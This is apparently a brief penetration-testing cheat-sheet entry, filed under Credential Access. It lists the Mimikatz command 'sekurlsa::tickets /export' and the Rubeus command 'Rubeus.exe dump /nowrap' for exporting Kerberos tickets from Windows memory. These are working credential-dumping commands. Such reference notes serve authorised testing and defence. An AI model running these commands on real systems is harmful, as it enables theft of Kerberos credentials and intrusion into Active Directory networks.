# Export Kerberos Tickets: Mimikatz and Rubeus

OS: Active_Directory, Windows
Description: Kerberos: export tickets
Security Domains: Credential Access (https://www.notion.so/Credential-Access-1444c8e523768003b6fde866419041dc?pvs=21)
Target_Technology: windows (https://www.notion.so/windows-1454c8e52376809bb701cef01e9f111a?pvs=21), mimikatz (https://www.notion.so/mimikatz-1464c8e5237680df8de9d1588f8d4980?pvs=21)

### Export Tickets from Mimikatz

```jsx
sekurlsa::tickets /export
```

### Rubeus

```jsx
Rubeus.exe dump /nowrap
```